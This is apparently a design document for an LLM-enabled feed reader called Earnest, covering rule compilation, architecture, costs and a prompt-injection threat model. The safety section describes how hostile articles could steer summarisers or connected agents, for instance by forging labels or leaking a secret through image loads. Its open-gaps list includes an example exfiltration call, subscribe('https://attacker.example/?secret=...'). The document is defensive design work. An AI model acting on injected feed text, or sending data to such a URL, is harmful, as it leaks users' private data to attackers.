# LLM integration

## Principle

Two directions, in this order:

1. **Bring your own agent.** External LLMs use Earnest as a tool, and write back annotations and notifications. Earnest needs no provider code. This tests whether any of it is worth using, and agents can run on your existing subscriptions rather than API keys.
2. **Bring your own key.** Earnest calls models itself for what must be fast, cheap and always on: embeddings, blurbs, editions.

Deterministic first: dedupe, cadences, mute lists, feed health and similarity clustering reduce a good share of the volume with no model at all.

**No evaluation has been run.** Whether small models summarise feeds well enough, and whether you'll actually read an agent's brief, are the open questions. The first milestone tests the second.

## Ideas, ranked

The research produced about 30 ideas. Keepers in build order. Costs are estimates at the 3000-items-a-day ceiling.

| # | Idea | Value | Monthly cost | Notes |
| --- | --- | --- | --- | --- |
| 1 | Exact and near-duplicate dedupe (canonical URL, content hash, simhash) | High | Nil | No LLM |
| 2 | Agent morning brief via MCP, written as a multi-entry annotation plus a notification | Unproven, cheap to test | Caller pays | Tests the brief's usefulness, not demand for agent identity |
| 3 | Embeddings | Enabling | Local, or about $1 | Everything below |
| 4 | Story clustering | Very high | Nil after embeddings | [Feedler](https://feedlerapp.com/press.html) groups stories on device without an LLM |
| 5 | Semantic search, more like this | High | Nil after embeddings | |
| 6 | Lazy summaries: one-line blurb, then 3 sentences | Expected | $3 to $5 | On open or in an edition |
| 7 | LLM edition: the daily or weekly paper with prose | High | About $3 | Before this, the edition is a deterministic list |
| 8 | Plain-language rules compiled to filters | Very high | Pennies | LLM compiles once, code runs |
| 9 | Watch rules with semantic match | High | Small | Embedding threshold, optional LLM check, budgets |
| 10 | Ask my feeds with verified passages | High | About $12 | After 4 and 5 |
| 11 | What's new since I last read about this | High | Small | Over clusters |

**Possible later:** translation, explain a term, audio edition, feed discovery from your reading, never-read audit (no LLM needed).

**Gimmicks or traps:** auto-unsubscribe; LLM-generated feeds for sites with none (fragile; use RSSHub); opaque "For You" ranking; rewriting titles; running an LLM over every item on every rule.

## Compile, don't run

The strongest idea from the research. A rule like "archive funding press releases, unless it's a company I follow" should not mean running a model over 3000 items a day.

```
You: "archive funding press releases, unless it's a company I follow"
                 │  LLM sees your words, and feed names as untrusted data
                 ▼
Rule AST: label = press_release AND text has "funding" AND NOT feed IN (following)
          Action: shelf = done, reason "Rule: funding PR"
                 │  validated, dry run on the last 7 days
                 ▼
"Would have matched 14 items. [Review them] [Save]"
```

It is cheaper, repeatable and inspectable, and article content can't rewrite the policy. Feed names can be publisher-controlled, so the compiler treats them as data and resolves them to feed IDs that you confirm in the dry run.

**It doesn't make the inputs trustworthy.** A label comes from a model reading the article, and keywords match text the author wrote, so a hostile article can decide whether its own predicate fires. Only the feed is outside the author's control, and even that fails if a blog you follow is compromised. So validate every compiled rule against a closed AST, and limit what each kind of predicate can do:

| Action | Predicate may use | Why |
| --- | --- | --- |
| Tag, suggest | Classifier labels, keywords, semantic match | Harmless; you see it |
| Shelf changes | As above, **and must be scoped to feeds you chose** | Revertible |
| Notify you | As above, with budget | A hostile post can spend budget, and nothing more, since the payload is server-generated |
| Leaves the system: Karakeep, webhooks | **Feeds you chose plus keywords you wrote. No model-derived predicates.** Sends entry ID and feed; the receiver fetches | Irreversible |

Classifier labels come from a closed vocabulary; anything else is dropped. **Agent-written labels are a separate namespace and can never appear in a rule**, or an agent could fire a rule by annotating an entry. Test with malicious classifier output.

## Architecture

```
ingest ─► dedupe ─► sanitise ─► embed ─► cluster ─► classify (small model, no tools)
                                                         │
             on open, or for an edition ─► summarise (mid model, no tools)
                                                         │
                         cache: (content_hash, prompt_version, model)
                                                         │
                    annotations table ◄── same table as external agents use
```

- **One annotation store, with provenance.** Internal pipeline output and external agent output share a table. Every row names its principal, model and source entries. Agent annotations are displayed as such, and marked untrusted when returned to any other agent. They stay out of embeddings, clustering, editions and classifier context. Otherwise annotations become a second-order injection channel.
- **Provider layer.** OpenAI-compatible as the default dialect (covers OpenAI, [Ollama](https://docs.ollama.com/api/introduction), [llama.cpp](https://github.com/ggml-org/llama.cpp/blob/master/tools/server/README.md)), plus Anthropic and Gemini for their batch and caching features. Per-task model choice.
- **Lazy by default.** An item is summarised when opened or chosen for an edition. Items with identical content share a summary. Cluster members don't: same story, different article.
- **On open is synchronous, at full price.** Batch can't serve it. Batch is [half price](https://platform.claude.com/docs/en/about-claude/pricing) but can take 24 hours, so use it for editions and backfills, submit early, and fall back to the synchronous API if it's late.
- **Prompts are versioned.** The version is in the cache key. A golden set of about 100 items with a rubric and an entailment check gates any prompt or model change.
- **Budgets.** A hard monthly spend limit per provider, visible in the UI, pausing rather than failing.

**Local.** CPU embeddings are plausible, but "one document every 29 seconds" is an arrival rate, not a benchmark. Backfilling a large OPML is the real test. Local summarisation on a CPU-only NAS is unproven and would compete with everything else on it. Measure both on your hardware. Local model endpoints need an explicit allowance in the outbound rules, since they are private addresses.

**On-device.** [Apple Foundation Models](https://developer.apple.com/documentation/foundationmodels) and [Gemini Nano through ML Kit](https://developers.google.com/ml-kit/genai) exist but are device-limited, vary across hardware and OS versions, and results would need syncing. Skip them until the server path is settled.

## Cost

3000 items a day is the design ceiling: 90,000 items a month, or 81M tokens in and 18M out at 900 and 200 per item if everything is summarised. Prices [from OpenAI](https://developers.openai.com/api/docs/pricing) and [Anthropic](https://platform.claude.com/docs/en/about-claude/pricing), checked 2026-11-01 and sure to change.

| Component | Assumption | Price per 1M, in / out | Monthly |
| --- | --- | --- | --- |
| Embeddings | 45M tokens, `text-embedding-3-small` | $0.02 | $0.90 |
| Classification at ingest | 500 in, 20 out per item, Haiku 5.5 batch | $0.05 / $0.25 | $2.70 |
| Summaries on open | 20% of items, Haiku 5.5 synchronous | $0.10 / $0.50 | $3.42 |
| Editions | 30 a month, 30k in, 2k out, Sonnet 5.5 | $2 / $10 | $2.40 |
| Ask my feeds | 20 a day, 8k in, 400 out, Sonnet 5.5 | $2 / $10 | $12.00 |
| **Total** | | | **About $21** |

For comparison, summarising everything eagerly costs $5.63 on `gpt-5-nano` batch, $8.55 on `gpt-6-luna` or Haiku 5.5 batch, and $171 on Sonnet 5.5 batch.

These figures exclude retries, chunking of long articles, and context-building for clusters. Treat **$10 to $40 a month at the ceiling** as the planning range, and much less at realistic volume. Quality on small models is an assumption: if they fail the golden set, costs rise by up to an order of magnitude. That's the real reason to stay lazy.

## Safety

Feed content is written by strangers and read by an LLM. [Indirect prompt injection](https://arxiv.org/html/2603.01564v1) remains unsolved, and [the lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) describes the failure: private data, untrusted content and a way to send data out. "[99% blocked is a failing grade](https://simonwillison.net/2025/Sep/26/how-to-stop-ais-lethal-trifecta/)". So rely on structure rather than prompts.

### Threat model

This bounds what a prompt-injected agent can do **through Earnest**. It says nothing about an agent's other tools, and it doesn't defend against a compromised server or client.

Invariants, each to be tested directly:

1. **Earnest's own models that read feed content have no tools, no network and a strict output schema.** Their output stays tainted. External agents read feed content while holding tools, which is why the rest of this list exists.
2. **No agent-reachable operation can cause an outbound request to a URL influenced by agent input, directly or indirectly.** That rules out `subscribe`, `discover`, `refresh`, webhook management, and any read that triggers extraction or image fetching. Agents read stored content only.
3. **Agent text doesn't leave the tailnet by default.** The one thing an agent can send out is a notification, and its push payload is server-generated. Text on the lock screen is your opt-in. A hostile agent can still choose *when* and *how often* to notify, within budget, and the push provider sees that timing.
4. **Agent text is inert in every client.** Plain text only, on all three: no HTML, Markdown, autolinks or remote images. A link appears only if that URL exists in the cited source entries. Otherwise an injected agent has stored XSS in your session.
5. **Tiers are enforced in the service layer**, over REST, CLI and MCP alike. A table in a document isn't a control.
6. **Provenance is generated by the server.** Nothing an agent or an article writes can appear as Earnest's own explanation.

7. **Agent selection stays unobservable to publishers.** An injected agent can choose between attacker-written entries according to a secret and surface the chosen one in a brief or alert. If opening it loads a remote image or preview, the attacker sees the choice. So every automatic fetch caused by agent-selected output (entry images, previews, notification rendering) comes only from what was cached at ingest, or waits for your click. Following a link yourself is outside this guarantee.

Within those limits, and apart from the [open gaps](#open-gaps), an agent with Earnest as its only tool has no path found so far for sending your data to an attacker. That has been reviewed, not proven; keep attacking it.

### Attacks inside Earnest

| Attack | Control |
| --- | --- |
| Article tells the summariser to add a link or image | Render generated text as plain text with inline references. Links exist only if the same URL appears in the source. No remote images |
| Article tries to exfiltrate other articles | The summariser sees one item or one cluster, and no reading history or private data |
| Article forges a label or keyword to trigger a rule | Predicates limited per action, above; budgets; nothing leaves the system on a model-derived predicate |
| Article floods clusters or rank | Per-source cap, canonical dedupe, visible provenance, chronological view always available |
| Fabricated summary or attribution | **Passage verification**: each cited span must exist in the cited content version. This proves the passage exists, not that it supports the claim, so evaluate support separately in the golden set. A claim with a failed citation stays visible and is flagged, rather than being quietly stripped of its citation |
| Agent writes a fake `summary` with fake citations | Agents can't write the `summary` kind; their `brief` and `note` kinds are labelled with the agent's name and rendered inert |
| Ask my feeds retrieves a malicious article | No tools. Answers render as text with verified passages, and nothing can fire from them |

### Action tiers

| Tier | Examples | May be triggered by | Reversible? |
| --- | --- | --- | --- |
| 0 | Dedupe, cluster, summarise, classify, an agent's own annotations | Automatic, or agents with `annotations:write` | Regenerable, or delete the annotation |
| 1 | Tag, shelf changes | Your compiled rules; agents with `state:write-human`; all logged | Yes, if the register is unchanged since |
| 2 | Notify you, within budget | Rules; agents with `notify:send`. `notify:urgent` is the same tier, bypassing quiet hours only | No, once delivered. Cancellable while held |
| 3 | Leaves the system: Karakeep, webhooks | Rules you wrote, per the predicate table above. Destinations registered by you | No |
| 4 | Subscribe, unsubscribe, refresh, delete, new tokens, new rules, new webhooks | You, in the UI or CLI. Agents can file a proposal | n/a |

Don't promise universal undo. Say which actions can be reverted, which cancelled and which are final. A revert checks the current revision and refuses to overwrite a later edit of yours.

### Open gaps

[The ninth review](raw/r6-security.md) found these, and they aren't closed yet. The first two are exits.

- **Proposals.** Approving `propose_subscription` fetches a URL the agent chose, so `subscribe("https://attacker.example/?secret=...")` returns behind one click. Proposed tokens and webhooks would carry agent-chosen scopes and destinations. Either a proposal can't carry a URL or destination and you enter it yourself, or approval shows it in full as untrusted. No review screen is specified yet.
- **Endpoints without a scope.** Agent scopes are defined for the MCP tools; the REST endpoints name none. `/v1/devices` is the worst, since a push endpoint is a destination the server posts to. `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export` and `/v1/activity` name no scope or allowlist filter either. Deny agent tokens by default, and keep device registration yours only, like webhooks.
- **Caller-supplied `source`.** `state:batch` takes `source` from the caller and the conflict policy ranks by it, so an agent holding `state:write-human` can pass as your deliberate action. Derive it from the token.
- **Clusters across the allowlist.** A cluster can mix allowlisted entries with private ones, and `get_briefing` groups by cluster. Filter membership by the token's allowlist when reading.
- **Annotations in retrieval.** Agent annotations stay out of embeddings, clustering, editions and classifiers, but search and ask my feeds aren't covered.
- **Hiding, not leaking.** An agent with `state:write-human` can mark an alert Done before you see it. The log records it, but only if you look. Plausible, not confirmed.

### External agents

The hardest case, because Earnest doesn't control the agent. A Claude or Codex session reading your feeds may also hold your email, shell and code. That session has the full trifecta, and Earnest supplies the untrusted content. Earnest can't fix that, but it can reduce the damage:

- Grant a **feed allowlist**: scheduled agents see the feeds you selected, and never private feeds by default.
- Label returned content as untrusted, in the field and in the tool description. A mitigation only.
- Return titles and summaries by default, and full bodies only on request.
- Keep tools narrow, and budgets and logs on.
- **Document it plainly:** give scheduled agents Earnest as their only tool. Connect Earnest to an agent with outbound tools only if you accept that a blog post could try to steer it.

### Other risks

- **Tool poisoning** ([Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)). Earnest shouldn't act as an MCP client. As a server, fix its descriptions and never interpolate feed data into them.
- **Filter bubbles.** Ranking stays optional, and a plain chronological view always exists. No silent retraining on clicks.
- **Copyright.** Personal use with local storage is low risk. A hosted tier storing full text and generating summaries for many users is a different legal situation. Take advice before then.
- **Provider data.** Summarising private newsletters or authenticated feeds sends them to a provider. Exclude private feeds by default, and check retention terms. [Gemini's unpaid tier may train on your data and allows human review](https://ai.google.dev/gemini-api/terms), although EEA, Swiss and UK users get paid-tier data terms.
